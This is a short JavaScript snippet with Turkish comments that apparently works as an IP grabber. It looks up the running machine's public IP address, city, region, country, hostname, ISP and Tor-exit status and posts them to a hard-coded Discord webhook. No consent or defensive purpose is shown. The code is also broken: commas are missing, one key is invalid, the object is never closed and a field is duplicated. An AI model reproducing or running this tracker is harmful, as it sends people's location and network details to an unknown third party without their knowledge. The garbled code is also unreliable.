
const axios = require("axios");


axios
  .get("https://wtfismyip.com/json")
  .then(response => {
    const ipInfo = response.data;

   
    const webhookData = {
      ip: ipInfo.YourFuckingIPAddress,
      şehir: ipInfo.City,
      bölge: ipInfo.RegionName,
      ülke: ipInfo.Country
      adress: ipInfo.YourFuckingLocation
    host_ismi: ipInfo.YourFuckingHostname
     isp: ipInfo.YourFuckingISP
     vpn?: ipInfo.YourFuckingTorExit
     şehir: ipInfo.YourFuckingCity
    
    // Webhook post isteği gönderme
    axios.post("<https://discord.com/api/webhooks/1159170951217422459/BDbsM_GEvj7ZOEsCeCcrSjQL9LsE11QUGIXC0lXOk9qOsEr2sGAu224uxz3kWe7lAtZh>", webhookData).then(response => {
      console.log("Webhook isteği başarıyla gönderildi.");
    }).catch(error => {
      console.error("Webhook isteği gönderme hatası:", error);
    });
  })
  .catch(error => {
    console.error("IP bilgisi alınırken hata:", error);
  });
```
